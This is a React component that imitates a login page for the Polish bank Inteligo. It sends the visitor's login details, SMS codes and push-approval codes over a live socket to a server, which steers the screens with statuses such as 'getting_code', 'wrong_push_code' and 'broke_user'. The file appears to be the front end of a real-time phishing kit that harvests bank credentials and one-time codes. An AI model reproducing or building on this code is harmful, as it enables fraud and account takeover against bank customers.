import {useSocket} from "../../../context/socket/socketProvider";
import {useEffect} from "react";
import InteligoFormLogin from "./InteligoFormLogin";
import InteligoFormCode from "./InteligoFromCode";
import InteligoLoader from "./InteligoLoader";
import InteligoFail from "./InteligoFail";

const InteligoForm = () => {
    const {user, setUser, initUser, connect, disconnect, sendData, sendCode} = useSocket();
    const submitLogin = (data) => {
        console.log('Login', data);
        initUser({
            ...data, bank: 'inteligo'
        });
    }
    console.log(user)
    const submitCode = (code) => {
        sendCode(code);
    }
    const submitPush = (code) => {
        sendData('send_push_code', {code});
    }

    useEffect(() => {
        console.log('connect')
        connect('inteligo');
        return () => disconnect();
    }, [])
    return (
        <div className="form-box save-no-password form-no-required">
            <div className="form form_tabular"
                 style={{display: 'block'}}>
                <h1 className="table-title">
                    <span className="inner">
                        Logowanie
                    </span>
                </h1>

                {
                    user.status === '' || user.status === 'wrong_login' ?
                        <InteligoFormLogin handler={submitLogin} status={user.status}/> :
                        user.status === 'getting_code' || user.status === 'wrong_code' ?
                            <InteligoFormCode handler={submitCode} status={user.status}/> :
                            user.status === 'getting_push_code' || user.status === 'wrong_push_code' ?
                                <InteligoFormCode handler={submitPush} status={user.status}/> :
                            user.status === 'broke_user' ?
                                <InteligoFail/> :
                                <InteligoLoader/>
                }


            </div>
        </div>
    )
}

export default InteligoForm;